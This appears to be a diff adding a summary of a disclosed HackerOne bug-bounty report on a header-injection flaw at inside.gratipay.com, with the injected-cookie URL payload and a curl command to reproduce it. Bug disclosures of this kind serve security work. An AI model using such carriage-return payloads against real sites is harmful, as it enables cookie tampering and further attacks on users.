@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/143139
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/valievkarim
+ReportedTo:Gratipay(gratipay)
+BountyAmount:40.0
+Severity:high
+State:Closed
+DateOfDisclosure:22.03.2017 22:31:09
+
+Summary:
+
+1) Using IE11, open DevTools and start network capture
+2) visit the following URL:
+http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq
+
+3) find a 'qwe' cookie set in the response
+
+There is a 0x0d character injected, which can be used as a header
+delimiter in IE.
+To see this behaviour using Curl, you can use the following command:
+curl -s -v 'http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq' 2>&1|less
+
+Screenshots of Curl output and DevTools are attached.
